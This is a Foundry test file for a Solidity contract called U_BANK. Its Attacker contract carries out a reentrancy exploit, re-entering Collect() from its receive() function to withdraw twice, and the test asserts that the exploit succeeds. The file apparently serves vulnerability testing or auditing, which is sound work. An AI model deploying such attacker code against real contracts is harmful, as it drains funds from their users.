
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {U_BANK, Log} from "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {
    U_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new U_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinSum is 2 ether, so attackVal must be at least 2 ether
        vm.assume(attackVal >= 2 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to have a balance in the bank first via Put()
        // unlockTime needs to be in the past for Collect to work

        // --- 3. Funding ---
        // Fund the victim contract so it has ETH to steal
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal);

        // Fund the Test Contract
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        // Setup: Attacker deposits funds with unlockTime = 0 (immediately unlocked)
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time to ensure unlockTime has passed
        vm.warp(block.timestamp + 1);
        
        // Execute the attack
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    U_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = U_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the bank with unlockTime = 0 (past time)
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialVictimBalance = address(victim).balance;
        storedAttackVal = val;
        attackCallCount = 0;

        // 2. Call the vulnerable Collect function
        victim.Collect(val);

        // 3. Verify Success Conditions
        // If we received more than our original deposit, the attack succeeded
        // The reentrancy should have allowed us to withdraw twice
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Re-enter if this is the first callback and victim still has funds
        if (attackCallCount < 2 && address(victim).balance >= storedAttackVal) {
            // Re-enter the Collect function
            victim.Collect(storedAttackVal);
        }
    }

    fallback() external payable {}
}
